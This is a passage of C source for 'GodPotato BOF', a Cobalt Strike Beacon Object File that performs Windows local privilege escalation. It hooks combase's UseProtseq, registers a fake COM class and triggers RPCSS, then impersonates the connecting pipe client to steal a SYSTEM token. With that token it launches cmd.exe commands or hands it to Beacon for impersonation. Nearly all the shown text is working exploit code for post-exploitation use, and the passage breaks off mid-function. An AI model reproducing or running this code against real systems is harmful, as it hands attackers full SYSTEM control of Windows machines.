 static HRESULT WINAPI fake_cf_CreateInstance(IClassFactory* This, IUnknown* pOuter, REFIID riid, void** ppv) { *ppv = NULL; return (HRESULT)0x80004002; }
 static HRESULT WINAPI fake_cf_LockServer(IClassFactory* This, BOOL fLock) { return 0; }
 
 /* Phase 2: register a fake COM class to force RPCSS to call UseProtseq on our process.
	Fallback to CoUnmarshalInterface if no pipe connection after that. */
 static int fire_trigger(void)
 {
	 DWORD cookie = 0;
	 HRESULT hr;
 
	 LOGI( "[*] fire: CoRegisterClassObject\n");
	 hr = api.pCoRegisterClassObject(
		 (REFCLSID)&trigger_clsid,
		 (IUnknown*)&fake_cf,
		 4,   /* CLSCTX_LOCAL_SERVER */
		 1,   /* REGCLS_MULTIPLEUSE */
		 &cookie);
	 LOGI( "[*] fire: CoRegisterClassObject hr=0x%08x cookie=%lu\n", (unsigned)hr, (unsigned long)cookie);
 
	 if (SUCCEEDED(hr) && cookie) {
		 api.pSleep(2000);
		 api.pCoRevokeClassObject(cookie);
		 LOGI( "[*] fire: CoRevokeClassObject done, pipe_connected=%d\n", pipe_connected);
	 }
 
	 trigger_with_fallbacks();
	 return 0;
 }
 
 /* Thread that registers our fake COM class then performs a native COM activation
	against 127.0.0.1. RPCSS brokers the cross-process activation and must call
	UseProtseq on OUR ORCB to configure the transport — that fires our hook. */
 static DWORD WINAPI fire_trigger_thread(LPVOID unused)
 {
	 static const GUID IID_IUnknown_local = {0,0,0,{0xC0,0,0,0,0,0,0,0x46}};
	 static WCHAR remote_server[] = L"127.0.0.1";
	 HRESULT hr;
	 DWORD cookie = 0;
	 COSERVERINFO server_info;
	 MULTI_QI qi;
	 (void)unused;
 
	 hr = api.pCoInitializeEx(NULL, 0);
	 log_hr_status("trigger thread: CoInitializeEx", hr);
 
	 if (SUCCEEDED(hr) || hr == (HRESULT)0x00000001) {
		 if (!g_malicious_len) {
			 if (prepare_objref() != 0)
				 BeaconPrintf(CALLBACK_ERROR, "[!] trigger thread: prepare_objref failed\n");
		 }
 
		 /* Register so RPCSS knows we are the server for this CLSID */
		 hr = api.pCoRegisterClassObject((REFCLSID)&trigger_clsid, (IUnknown*)&fake_cf,
										 4 /*CLSCTX_LOCAL_SERVER*/, 1 /*REGCLS_MULTIPLEUSE*/, &cookie);
		 LOGI( "[*] trigger thread: CoRegisterClassObject hr=0x%08x cookie=%lu clsid=%ls\n",
					  (unsigned)hr, (unsigned long)cookie, trigger_clsid_w);
 
		 if (SUCCEEDED(hr) && cookie) {
			 /* Native remote activation via RPCSS. This keeps the trigger in WinAPI
				instead of shelling out to PowerShell. */
			 memset(&server_info, 0, sizeof(server_info));
			 server_info.pwszName = remote_server;
			 memset(&qi, 0, sizeof(qi));
			 qi.pIID = (IID*)&IID_IUnknown_local;
			 hr = api.pCoCreateInstanceEx((REFCLSID)&trigger_clsid, NULL,
										  CLSCTX_REMOTE_SERVER, &server_info, 1, &qi);
			 LOGI(
						  "[*] trigger thread: CoCreateInstanceEx hr=0x%08x qi.hr=0x%08x server=%ls\n",
						  (unsigned)hr, (unsigned)qi.hr, remote_server);
			 if (qi.pItf) {
				 ((IUnknown*)qi.pItf)->lpVtbl->Release((IUnknown*)qi.pItf);
				 qi.pItf = NULL;
			 }
 
			 api.pSleep(5000); /* wait for RPCSS to broker activation and react */
			 LOGI( "[*] trigger thread: post-launch pipe_connected=%d\n",
						  pipe_connected);
			 trigger_with_fallbacks();
			 api.pCoRevokeClassObject(cookie);
		 } else {
			 trigger_with_fallbacks();
		 }
		 api.pCoUninitialize();
	 } else {
		 BeaconPrintf(CALLBACK_ERROR, "[!] trigger thread: CoInitializeEx failed hr=0x%08x, skipping trigger\n", (unsigned)hr);
	 }
	LOGI( "[*] trigger thread: done, pipe_connected=%d\n", pipe_connected);
	 return 0;
 }
 
 /* Build lpCommandLine as: "<sysdir>\cmd.exe /c <cmd_ansi>"
	Using the full path avoids PATH-lookup failures under alternate tokens.
	lpApplicationName is left NULL so the full path in lpCommandLine resolves it directly. */
 static void create_process_read_out(HANDLE token, const char* cmd_ansi, int cmd_ansi_len)
 {
	 SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
	 HANDLE hRead = NULL, hWrite = NULL;
	 STARTUPINFOW si = {0};
	 PROCESS_INFORMATION pi = {0};
	 HANDLE primary = NULL;
	 WCHAR cmdline[2048];
	 UINT i = 0;
	 BOOL capture_output = TRUE;
	 /* Last-resort default — built from char literals (no .rodata dependency). */
	 char fallback_cmd[] = {'w','h','o','a','m','i','\0'};
	 if (!cmd_ansi || cmd_ansi_len <= 0 || (unsigned char)cmd_ansi[0] < 0x20) {
		 cmd_ansi     = fallback_cmd;
		 cmd_ansi_len = 6;
	 }
 
	 /* Prepend "<sysdir>\cmd.exe /c " to the user command so the full executable
		path is in lpCommandLine — no PATH lookup, works under any token. */
	 {
		 WCHAR sysdir[MAX_PATH];
		 UINT n = api.pGetSystemDirectoryW ? api.pGetSystemDirectoryW(sysdir, MAX_PATH) : 0;
		 if (n > 0 && n < MAX_PATH - 12) {
			 UINT j;
			 for (j = 0; j < n; j++) cmdline[j] = sysdir[j];
			 i = j;
			 if (cmdline[i - 1] != L'\\') cmdline[i++] = L'\\';
			 cmdline[i++]=L'c'; cmdline[i++]=L'm'; cmdline[i++]=L'd';
			 cmdline[i++]=L'.'; cmdline[i++]=L'e'; cmdline[i++]=L'x';
			 cmdline[i++]=L'e'; cmdline[i++]=L' ';
		 }
		 /* If user command already starts with "cmd " strip it to avoid "cmd.exe /c cmd /c ..."
			being passed (still works either way, but this is cleaner). */
		 {
			 const char* p = cmd_ansi;
			 int l = cmd_ansi_len;
			 if (l >= 4 &&
				 (p[0]=='c'||p[0]=='C') && (p[1]=='m'||p[1]=='M') &&
				 (p[2]=='d'||p[2]=='D') && p[3]==' ') {
				 /* "cmd " -> skip and use the rest ("/c ...") */
				 p += 4; l -= 4;
			 } else {
				 /* bare command: prepend "/c " */
				 cmdline[i++]=L'/'; cmdline[i++]=L'c'; cmdline[i++]=L' ';
			 }
			 if (api.pMultiByteToWideChar) {
				 int wlen = api.pMultiByteToWideChar(CP_UTF8, 0, p, l, cmdline + i, (int)(2046 - i));
				 if (wlen <= 0)
					 wlen = api.pMultiByteToWideChar(CP_ACP, 0, p, l, cmdline + i, (int)(2046 - i));
				 if (wlen > 0) i += (UINT)wlen;
			 }
		 }
		 cmdline[i] = L'\0';
	 }
 
	 si.cb = sizeof(si);
	 if (capture_output) {
		 if (!api.pCreatePipe(&hRead, &hWrite, &sa, 8196)) {
			 BeaconPrintf(CALLBACK_ERROR, "[!] CreatePipe failed\n");
			 return;
		 }
		 si.hStdOutput = hWrite;
		 si.hStdError  = hWrite;
		 si.hStdInput  = NULL;
		 si.dwFlags    = GOD_STARTF_USESTDHANDLES;
		 /* Only the write end needs to be inheritable; keep read end non-inheritable. */
		 api.pSetHandleInformation(hWrite, GOD_HANDLE_FLAG_INHERIT, GOD_HANDLE_FLAG_INHERIT);
		 api.pSetHandleInformation(hRead,  GOD_HANDLE_FLAG_INHERIT, 0);
	 }
 
	 {
		 DWORD ret_len = 0;
		 api.pGetTokenInformation(token, 6 /* TokenType */, NULL, 0, &ret_len);
		 if (ret_len) {
			 DWORD type_buf = 0;
			 api.pGetTokenInformation(token, 6 /* TokenType */, &type_buf, sizeof(type_buf), &ret_len);
			 if (type_buf != GOD_TokenPrimary) {
				 if (api.pDuplicateTokenEx(token, GOD_TOKEN_ELEVATION, NULL, GOD_TokenImpersonationLevel, GOD_TokenPrimary, &primary))
					 token = primary;
			 }
		 }
	 }
	 {
		 BOOL created = FALSE;
		 /* Impersonate so calling thread has SE_ASSIGNPRIMARYTOKEN_NAME / SE_INCREASE_QUOTA_NAME.
			Only inherit handles for the short default whoami path where we capture stdout. */
		 BOOL impersonated = api.pImpersonateLoggedOnUser && api.pImpersonateLoggedOnUser(token);
		 if (api.pCreateProcessAsUserW(token, NULL, cmdline, NULL, NULL, capture_output, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
			 created = TRUE;
		 else
			 LOGI( "[*] CreateProcessAsUserW err=%lu\n", (unsigned long)api.pGetLastError());
		 if (impersonated) api.pRevertToSelf();
 
		 if (!created) {
			 /* Fallback: CreateProcessWithTokenW (no pipe inherit via seclogon, but runs the cmd). */
			 if (api.pCreateProcessWithTokenW(token, 0, NULL, cmdline, GOD_CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
				 created = TRUE;
			 else
				 LOGI( "[*] CreateProcessWithTokenW err=%lu\n", (unsigned long)api.pGetLastError());
		 }
 
		 if (created) {
			 LOGK( "[*] process start with pid %u\n", (unsigned)pi.dwProcessId);
			 if (capture_output) {
				 api.pCloseHandle(hWrite);
				 hWrite = NULL;
				 api.pWaitForSingleObject(pi.hProcess, 30000);
				 for (;;) {
					 DWORD avail = 0, nr = 0, left = 0;
					 char buf[4096];
					 if (!api.pPeekNamedPipe(hRead, buf, sizeof(buf), &nr, &avail, &left)) break;
					 if (avail == 0) break;
					 if (api.pReadFile(hRead, buf, sizeof(buf), &nr, NULL) && nr > 0)
						 BeaconOutput(CALLBACK_OUTPUT, buf, (int)nr);
				 }
			 }
		 } else
			 BeaconPrintf(CALLBACK_ERROR, "[!] Cannot create process\n");
	 }
	 if (primary) api.pCloseHandle(primary);
	 if (pi.hProcess) api.pCloseHandle(pi.hProcess);
	 if (pi.hThread) api.pCloseHandle(pi.hThread);
	 if (hRead) api.pCloseHandle(hRead);
	 if (hWrite) api.pCloseHandle(hWrite);
 }
 
 static int resolve_apis(void)
 {
	 HMODULE (WINAPI *pLoadLibraryA)(LPCSTR) = (HMODULE (WINAPI *)(LPCSTR))LoadLibraryA;
	 FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR) = (FARPROC (WINAPI *)(HMODULE, LPCSTR))GetProcAddress;
 
	 api.hKernel32 = pLoadLibraryA("kernel32.dll");
	 if (!api.hKernel32) return -1;
	 api.pGetCurrentProcess = (fn_GetCurrentProcess)pGetProcAddress(api.hKernel32, "GetCurrentProcess");
	 api.pGetCurrentThread = (fn_GetCurrentThread)pGetProcAddress(api.hKernel32, "GetCurrentThread");
	 api.pCreateProcessW = (fn_CreateProcessW)pGetProcAddress(api.hKernel32, "CreateProcessW");
	 api.pCreateThread = (fn_CreateThread)pGetProcAddress(api.hKernel32, "CreateThread");
	 api.pCloseHandle = (fn_CloseHandle)pGetProcAddress(api.hKernel32, "CloseHandle");
	 api.pLocalFree = (fn_LocalFree)pGetProcAddress(api.hKernel32, "LocalFree");
	 api.pGetModuleHandleW = (fn_GetModuleHandleW)pGetProcAddress(api.hKernel32, "GetModuleHandleW");
	 api.pVirtualProtect = (fn_VirtualProtect)pGetProcAddress(api.hKernel32, "VirtualProtect");
	 api.pCreateNamedPipeW = (fn_CreateNamedPipeW)pGetProcAddress(api.hKernel32, "CreateNamedPipeW");
	 api.pConnectNamedPipe = (fn_ConnectNamedPipe)pGetProcAddress(api.hKernel32, "ConnectNamedPipe");
	 api.pCreateEventW = (fn_CreateEventW)pGetProcAddress(api.hKernel32, "CreateEventW");
	 api.pWaitForSingleObject = (fn_WaitForSingleObject)pGetProcAddress(api.hKernel32, "WaitForSingleObject");
	 api.pCreateFileW = (fn_CreateFileW)pGetProcAddress(api.hKernel32, "CreateFileW");
	 api.pCreatePipe = (fn_CreatePipe)pGetProcAddress(api.hKernel32, "CreatePipe");
	 api.pSetHandleInformation = (fn_SetHandleInformation)pGetProcAddress(api.hKernel32, "SetHandleInformation");
	 api.pPeekNamedPipe = (fn_PeekNamedPipe)pGetProcAddress(api.hKernel32, "PeekNamedPipe");
	 api.pReadFile = (fn_ReadFile)pGetProcAddress(api.hKernel32, "ReadFile");
	 api.pOpenProcess = (fn_OpenProcess)pGetProcAddress(api.hKernel32, "OpenProcess");
	 api.pDuplicateHandle = (fn_DuplicateHandle)pGetProcAddress(api.hKernel32, "DuplicateHandle");
	 api.pSleep = (fn_Sleep)pGetProcAddress(api.hKernel32, "Sleep");
	 api.pGetCurrentProcessId = (fn_GetCurrentProcessId)pGetProcAddress(api.hKernel32, "GetCurrentProcessId");
	 api.pGetLastError = (fn_GetLastError)pGetProcAddress(api.hKernel32, "GetLastError");
	 api.pGetSystemDirectoryW = (fn_GetSystemDirectoryW)pGetProcAddress(api.hKernel32, "GetSystemDirectoryW");
	 api.pMultiByteToWideChar = (fn_MultiByteToWideChar)pGetProcAddress(api.hKernel32, "MultiByteToWideChar");
	 if (!api.pGetCurrentProcess || !api.pGetCurrentThread || !api.pCreateThread || !api.pCloseHandle || !api.pLocalFree || !api.pGetModuleHandleW || !api.pVirtualProtect ||
		 !api.pCreateNamedPipeW || !api.pConnectNamedPipe || !api.pCreateEventW || !api.pWaitForSingleObject || !api.pCreateFileW || !api.pCreatePipe || !api.pPeekNamedPipe || !api.pReadFile)
		 return -1;
 
	 api.hNtdll = pLoadLibraryA("ntdll.dll");
	 if (!api.hNtdll) return -1;
	 api.pNtQuerySystemInformation = (fn_NtQuerySystemInformation)pGetProcAddress(api.hNtdll, "NtQuerySystemInformation");
	 api.pNtDuplicateObject = (fn_NtDuplicateObject)pGetProcAddress(api.hNtdll, "NtDuplicateObject");
	 if (!api.pNtQuerySystemInformation || !api.pNtDuplicateObject) return -1;
 
	 api.hAdvapi32 = pLoadLibraryA("advapi32.dll");
	 if (!api.hAdvapi32) return -1;
	 api.pConvertStringSecurityDescriptorToSecurityDescriptorW = (fn_ConvertStringSecurityDescriptorToSecurityDescriptorW)pGetProcAddress(api.hAdvapi32, "ConvertStringSecurityDescriptorToSecurityDescriptorW");
	 api.pImpersonateNamedPipeClient = (fn_ImpersonateNamedPipeClient)pGetProcAddress(api.hAdvapi32, "ImpersonateNamedPipeClient");
	 api.pRevertToSelf = (fn_RevertToSelf)pGetProcAddress(api.hAdvapi32, "RevertToSelf");
	 api.pOpenProcessToken = (fn_OpenProcessToken)pGetProcAddress(api.hAdvapi32, "OpenProcessToken");
	 api.pOpenThreadToken = (fn_OpenThreadToken)pGetProcAddress(api.hAdvapi32, "OpenThreadToken");
	 api.pGetTokenInformation = (fn_GetTokenInformation)pGetProcAddress(api.hAdvapi32, "GetTokenInformation");
	 api.pDuplicateTokenEx = (fn_DuplicateTokenEx)pGetProcAddress(api.hAdvapi32, "DuplicateTokenEx");
	 api.pCreateProcessWithTokenW = (fn_CreateProcessWithTokenW)pGetProcAddress(api.hAdvapi32, "CreateProcessWithTokenW");
	 api.pCreateProcessAsUserW = (fn_CreateProcessAsUserW)pGetProcAddress(api.hAdvapi32, "CreateProcessAsUserW");
	 api.pImpersonateLoggedOnUser = (fn_ImpersonateLoggedOnUser)pGetProcAddress(api.hAdvapi32, "ImpersonateLoggedOnUser");
	 api.pGetSidSubAuthority = (fn_GetSidSubAuthority)pGetProcAddress(api.hAdvapi32, "GetSidSubAuthority");
	 api.pGetSidSubAuthorityCount = (fn_GetSidSubAuthorityCount)pGetProcAddress(api.hAdvapi32, "GetSidSubAuthorityCount");
	 if (!api.pConvertStringSecurityDescriptorToSecurityDescriptorW || !api.pImpersonateNamedPipeClient || !api.pRevertToSelf ||
		 !api.pOpenProcessToken || !api.pOpenThreadToken || !api.pGetTokenInformation || !api.pDuplicateTokenEx || !api.pCreateProcessWithTokenW || !api.pCreateProcessAsUserW)
		 return -1;
 
	 api.hOle32 = pLoadLibraryA("ole32.dll");
	 if (!api.hOle32) return -1;
	 api.pCoInitializeEx = (fn_CoInitializeEx)pGetProcAddress(api.hOle32, "CoInitializeEx");
	 api.pCoUninitialize = (fn_CoUninitialize)pGetProcAddress(api.hOle32, "CoUninitialize");
	 api.pCoUnmarshalInterface = (fn_CoUnmarshalInterface)pGetProcAddress(api.hOle32, "CoUnmarshalInterface");
	 api.pCreateBindCtx = (fn_CreateBindCtx)pGetProcAddress(api.hOle32, "CreateBindCtx");
	 api.pCreateObjrefMoniker = (fn_CreateObjrefMoniker)pGetProcAddress(api.hOle32, "CreateObjrefMoniker");
	 api.pCoTaskMemAlloc = (fn_CoTaskMemAlloc)pGetProcAddress(api.hOle32, "CoTaskMemAlloc");
	 api.pCoTaskMemFree = (fn_CoTaskMemFree)pGetProcAddress(api.hOle32, "CoTaskMemFree");
	 api.pCoRegisterClassObject = (fn_CoRegisterClassObject)pGetProcAddress(api.hOle32, "CoRegisterClassObject");
	 api.pCoRevokeClassObject = (fn_CoRevokeClassObject)pGetProcAddress(api.hOle32, "CoRevokeClassObject");
	 api.pCoCreateInstance = (fn_CoCreateInstance)pGetProcAddress(api.hOle32, "CoCreateInstance");
	 api.pCoCreateInstanceEx = (fn_CoCreateInstanceEx)pGetProcAddress(api.hOle32, "CoCreateInstanceEx");
	 if (!api.pCoUnmarshalInterface || !api.pCreateBindCtx || !api.pCreateObjrefMoniker || !api.pCoTaskMemAlloc || !api.pCoTaskMemFree
		 || !api.pCoRegisterClassObject || !api.pCoRevokeClassObject || !api.pCoCreateInstance || !api.pCoCreateInstanceEx)
		 return -1;
	 return 0;
 }
 
 void go(char* args, int length)
 {
	 datap parser;
	 char* cmd_str = NULL;
	 int cmd_len = 0;
	 char* pipe_name = NULL;
	 int pipe_len = 0;
	 int use_beacon_token = 0;
	 int cmd_is_option_only = 0;
	 HANDLE hPipeThread = NULL;
	 HANDLE hTriggerThread = NULL;
	 /* Built char-by-char so the values are embedded as immediates in .text,
		not copied from .rodata (which some BOF loaders zero out). */
	 char default_cmd[] = {'c','m','d',' ','/',  'c',' ','w','h','o','a','m','i','\0'};
	 LOGI( "Starting GodPotato BOF\n");
	 if (resolve_apis() != 0) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] Failed to resolve APIs\n");
		 return;
	 }
	 system_token = NULL;
	 pipe_connected = 0;
	 is_hook = 0;
	 is_start = 0;
	 g_malicious_len = 0;
 
	 /* Initialize vtables at runtime — static fn-ptr initializers require relocations
		that BOF loaders may not apply to .data, causing crashes */
	 fake_vtbl.QueryInterface = fake_QueryInterface;
	 fake_vtbl.AddRef         = fake_AddRef;
	 fake_vtbl.Release        = fake_Release;
	 fake_unknown.lpVtbl      = &fake_vtbl;
 
	 bufstream_vtbl.QueryInterface  = bufstream_QueryInterface;
	 bufstream_vtbl.AddRef          = bufstream_AddRef;
	 bufstream_vtbl.Release         = bufstream_Release;
	 bufstream_vtbl.Read            = bufstream_Read;
	 bufstream_vtbl.Write           = bufstream_Write;
	 bufstream_vtbl.Seek            = bufstream_Seek;
	 bufstream_vtbl.SetSize         = bufstream_SetSize;
	 bufstream_vtbl.CopyTo          = bufstream_CopyTo;
	 bufstream_vtbl.Commit          = bufstream_Commit;
	 bufstream_vtbl.Revert          = bufstream_Revert;
	 bufstream_vtbl.LockRegion      = bufstream_LockRegion;
	 bufstream_vtbl.UnlockRegion    = bufstream_UnlockRegion;
	 bufstream_vtbl.Stat            = bufstream_Stat;
	 bufstream_vtbl.Clone           = bufstream_Clone;
 
	 fake_cf_vtbl.QueryInterface    = (HRESULT (WINAPI*)(IClassFactory*, REFIID, void**))fake_cf_QueryInterface;
	 fake_cf_vtbl.AddRef            = (ULONG   (WINAPI*)(IClassFactory*))fake_cf_AddRef;
	 fake_cf_vtbl.Release           = (ULONG   (WINAPI*)(IClassFactory*))fake_cf_Release;
	 fake_cf_vtbl.CreateInstance    = fake_cf_CreateInstance;
	 fake_cf_vtbl.LockServer        = fake_cf_LockServer;
	 fake_cf.lpVtbl                 = &fake_cf_vtbl;
 
	 BeaconDataParse(&parser, args, length);
	 cmd_str = BeaconDataExtract(&parser, &cmd_len);
	 pipe_name = BeaconDataExtract(&parser, &pipe_len);
	 if (!pipe_name || pipe_len <= 0) {
		 pipe_name = NULL;
		 pipe_len = 0;
	 }
	 /* Cobalt Strike teamserver (Java) sends the literal string "null" via bof_pack
		when inline-execute is called with no arguments (null.toString() artifact).
		Treat it the same as no argument. */
	 if (cmd_str && cmd_len > 0 &&
		 cmd_str[0]=='n' && cmd_str[1]=='u' && cmd_str[2]=='l' && cmd_str[3]=='l' &&
		 (cmd_len == 4 || (cmd_len == 5 && cmd_str[4] == '\0'))) {
		 cmd_str = NULL;
		 cmd_len = 0;
	 }
	 if ((!pipe_name || pipe_len <= 0) && cmd_str && cmd_len > 0) {
		 char* parsed_cmd = NULL;
		 int parsed_cmd_len = 0;
		 char* parsed_pipe = NULL;
		 int parsed_pipe_len = 0;
		 parse_command_and_pipe_text(cmd_str, cmd_len, &parsed_cmd, &parsed_cmd_len, &parsed_pipe, &parsed_pipe_len);
		 if (parsed_pipe && parsed_pipe_len > 0) {
			 pipe_name = parsed_pipe;
			 pipe_len = parsed_pipe_len;
			 cmd_str = parsed_cmd;
			 cmd_len = parsed_cmd_len;
		 }
	 }
	 if (cmd_str && cmd_len > 0 &&
		 (ascii_token_equals(cmd_str, cmd_len, "-pipe") ||
		  ascii_token_equals(cmd_str, cmd_len, "-cmd"))) {
		 cmd_is_option_only = 1;
	 }
	 if (args && length > 0 && ((!cmd_str || cmd_len <= 0) || cmd_is_option_only)) {
		 char* p = args;
		 int   l = length;
		 int   k;
		 char* raw_cmd = NULL;
		 int   raw_cmd_len = 0;
		 /* strip leading whitespace */
		 while (l > 0 && (*p == ' ' || *p == '\t')) { p++; l--; }
		 if (l > 5 && p[0]=='-' && p[1]=='c' && p[2]=='m' && p[3]=='d' && p[4]==' ') {
			 p += 5; l -= 5;
			 while (l > 0 && (*p == ' ' || *p == '\t')) { p++; l--; }
		 }
		 /* strip trailing whitespace / nulls */
		 while (l > 0 && (p[l-1] == '\0' || p[l-1] == ' ' || p[l-1] == '\t' || p[l-1] == '\r' || p[l-1] == '\n')) l--;
		 /* Treat raw "null" the same as no argument for direct inline-execute. */
		 if (l == 4 &&
			 (p[0] == 'n' || p[0] == 'N') &&
			 (p[1] == 'u' || p[1] == 'U') &&
			 (p[2] == 'l' || p[2] == 'L') &&
			 (p[3] == 'l' || p[3] == 'L')) {
			 l = 0;
		 }
		 if (l > 0) { raw_cmd = p; raw_cmd_len = l; }
		 for (k = 0; k + 6 < l; k++) {
			 if (p[k] == '-' && p[k+1] == 'p' && p[k+2] == 'i' && p[k+3] == 'p' && p[k+4] == 'e' &&
				 (p[k+5] == ' ' || p[k+5] == '\t')) {
				 char* q = p + k + 6;
				 int   m = l - (k + 6);
				 while (m > 0 && (*q == ' ' || *q == '\t')) { q++; m--; }
				 while (m > 0 && (q[m-1] == '\0' || q[m-1] == ' ' || q[m-1] == '\t' || q[m-1] == '\r' || q[m-1] == '\n')) m--;
				 if (m > 0) { pipe_name = q; pipe_len = m; }
				 break;
			 }
		 }
		 if (!cmd_str || cmd_len <= 0 || cmd_is_option_only) {
			 if (raw_cmd_len > 0) {
				 cmd_str = raw_cmd;
				 cmd_len = raw_cmd_len;
			 } else {
				 cmd_str = NULL;
				 cmd_len = 0;
			 }
		 }
	 }
	if (!cmd_str || cmd_len <= 0) {
		cmd_str = (char*)default_cmd;
		cmd_len = (int)sizeof(default_cmd) - 1;
	}
	 /* Normalize the command bounds regardless of whether it came from
		BeaconDataExtract or raw inline-execute bytes. */
	 if (cmd_str && cmd_len > 0) {
		 while (cmd_len > 0 &&
				(cmd_str[0] == ' ' || cmd_str[0] == '\t' || cmd_str[0] == '\r' || cmd_str[0] == '\n'))
		 {
			 cmd_str++;
			 cmd_len--;
		 }
		 while (cmd_len > 0 &&
				(cmd_str[cmd_len - 1] == '\0' || cmd_str[cmd_len - 1] == ' ' ||
				 cmd_str[cmd_len - 1] == '\t' || cmd_str[cmd_len - 1] == '\r' ||
				 cmd_str[cmd_len - 1] == '\n'))
		 {
			 cmd_len--;
		 }
		 /* Peel repeated outer quote pairs added by inline-execute parsing. */
		 while (cmd_len >= 2 &&
				((cmd_str[0] == '"'  && cmd_str[cmd_len - 1] == '"') ||
				 (cmd_str[0] == '\'' && cmd_str[cmd_len - 1] == '\'')))
		 {
			 cmd_str++;
			 cmd_len -= 2;
			 while (cmd_len > 0 &&
					(cmd_str[0] == ' ' || cmd_str[0] == '\t' || cmd_str[0] == '\r' || cmd_str[0] == '\n'))
			 {
				 cmd_str++;
				 cmd_len--;
			 }
			 while (cmd_len > 0 &&
					(cmd_str[cmd_len - 1] == '\0' || cmd_str[cmd_len - 1] == ' ' ||
					 cmd_str[cmd_len - 1] == '\t' || cmd_str[cmd_len - 1] == '\r' ||
					 cmd_str[cmd_len - 1] == '\n'))
			 {
				 cmd_len--;
			 }
		 }
	 }
	 /* Essential sanity-check: ensure command buffer is present and non-empty. */
	if (!cmd_str || cmd_len <= 0) {
		cmd_str = (char*)default_cmd;
		cmd_len = (int)sizeof(default_cmd) - 1;
	}
	/* Debug-only sanity check (disabled):
	 * if ((unsigned char)cmd_str[0] < 0x20 || (unsigned char)cmd_str[0] > 0x7e) {
	 *     cmd_str = (char*)default_cmd;
	 *     cmd_len = (int)sizeof(default_cmd) - 1;
	 * }
	 */
	if (cmd_str && cmd_len > 0 && is_help_token(cmd_str, cmd_len)) {
		print_usage();
		return;
	}
	if (pipe_name && pipe_len > 0) {
		while (pipe_len > 0 &&
		       (pipe_name[0] == ' ' || pipe_name[0] == '\t' || pipe_name[0] == '\r' || pipe_name[0] == '\n')) {
			 pipe_name++;
			 pipe_len--;
		 }
		 while (pipe_len > 0 &&
				(pipe_name[pipe_len - 1] == '\0' || pipe_name[pipe_len - 1] == ' ' ||
				 pipe_name[pipe_len - 1] == '\t' || pipe_name[pipe_len - 1] == '\r' ||
				 pipe_name[pipe_len - 1] == '\n')) {
			 pipe_len--;
		 }
		 while (pipe_len >= 2 &&
				((pipe_name[0] == '"'  && pipe_name[pipe_len - 1] == '"') ||
				 (pipe_name[0] == '\'' && pipe_name[pipe_len - 1] == '\''))) {
			 pipe_name++;
			 pipe_len -= 2;
		 }
		 if (pipe_len == 4 &&
			 (pipe_name[0] == 'n' || pipe_name[0] == 'N') &&
			 (pipe_name[1] == 'u' || pipe_name[1] == 'U') &&
			 (pipe_name[2] == 'l' || pipe_name[2] == 'L') &&
			 (pipe_name[3] == 'l' || pipe_name[3] == 'L')) {
			 pipe_name = NULL;
			 pipe_len = 0;
		 }
	 }
	 if (cmd_str && cmd_len > 0 && ascii_token_equals(cmd_str, cmd_len, "-pipe")) {
		 cmd_str = (char*)default_cmd;
		 cmd_len = (int)sizeof(default_cmd) - 1;
	 }
	 if (cmd_len == 5 &&
		 (cmd_str[0] == 't' || cmd_str[0] == 'T') &&
		 (cmd_str[1] == 'o' || cmd_str[1] == 'O') &&
		 (cmd_str[2] == 'k' || cmd_str[2] == 'K') &&
		 (cmd_str[3] == 'e' || cmd_str[3] == 'E') &&
		 (cmd_str[4] == 'n' || cmd_str[4] == 'N')) {
		 use_beacon_token = 1;
	 }
	 /* Wide conversion is deferred to create_process_read_out so the full path
		to cmd.exe can be prepended there, avoiding PATH-lookup failures. */
 
	 /* init_context only needs combase.dll loaded (already loaded in any process),
		not CoInitializeEx — so we can find and hook before any CoInitializeEx. */
	 if (init_context() != 0) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] No combase module or IDL structure not found\n");
		 goto cleanup;
	 }
	 build_pipe_strings(pipe_name, pipe_len, args);
	 init_trigger_clsid(args);
	 LOGI( "[*] CombaseModule: %p\n", combase_base);
	 LOGI( "[*] DispatchTable: %p\n", dispatch_table_ptr);
	 LOGI( "[*] UseProtseqFunction: %p\n", use_protseq_ptr);
	 LOGI( "[*] UseProtseqFunctionParamCount: %u\n", (unsigned)use_protseq_param_count);
 
	 /* Install hook BEFORE CoInitializeEx so we catch the UseProtseq call that
		RPCSS makes when setting up the new apartment's transport. */
	 LOGK( "[*] HookRPC\n");
	 hook_rpc();
	 LOGK( "[*] Start PipeServer\n");
	 is_start = 1;
	 hPipeThread = api.pCreateThread(NULL, 0, pipe_server_thread, NULL, 0, NULL);
	 if (!hPipeThread) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create pipe server thread\n");
		 goto cleanup;
	 }
 
	 /* Give pipe server thread time to create the named pipe. */
	 api.pSleep(200);
 
	 /* Trigger: spin up a new STA thread that calls CoInitializeEx.
		RPCSS will call UseProtseq to configure that apartment's transport,
		our hook intercepts and redirects RPCSS to our named pipe. */
	 LOGK( "[*] Trigger RPCSS via new STA thread\n");
	 hTriggerThread = api.pCreateThread(NULL, 0, fire_trigger_thread, NULL, 0, NULL);
	 if (!hTriggerThread) {
		 BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create trigger thread\n");
		 goto cleanup;
	 }
 
	 {
		 /* Hard timeout: 300 x 100 ms = 30 seconds. */
		 int wait_iterations = 0;
		 while (!pipe_connected && wait_iterations < 300) {
			 if ((wait_iterations % 20) == 0) {
				 LOGI(
					 "[*] waiting for pipe connection: state=%d token=%p iter=%d\n",
					 pipe_connected, system_token, wait_iterations);
			 }
			 api.pSleep(100);
			 wait_iterations++;
		 }
		 if (!pipe_connected) {
			 BeaconPrintf(CALLBACK_ERROR, "[!] Timed out waiting for pipe connection\n");
			 pipe_connected = -1;
		 }
	 }
	 LOGK( "[*] pipe_connected=%d\n", pipe_connected);
	 if (pipe_connected != 1) {
		 goto cleanup;
	 }
 
	 {
		 int wait_loops = 0;
		 while (!system_token && wait_loops < 200) {
			 api.pSleep(50);
			 wait_loops++;
		 }
	 }
	 api.pSleep(200);
 
	 if (system_token) {
		 LOGK( "[*] Got SYSTEM token\n");
		 if (use_beacon_token) {
			 if (BeaconUseToken(system_token)) {
				 LOGI( "[*] Beacon is now impersonating NT AUTHORITY\\SYSTEM\n");
				 /* Keep the token handle alive after BeaconUseToken so Beacon can continue
					using the impersonation context for subsequent commands. */
				 system_token = NULL;
			 } else {
				 BeaconPrintf(CALLBACK_ERROR, "[!] BeaconUseToken failed\n");
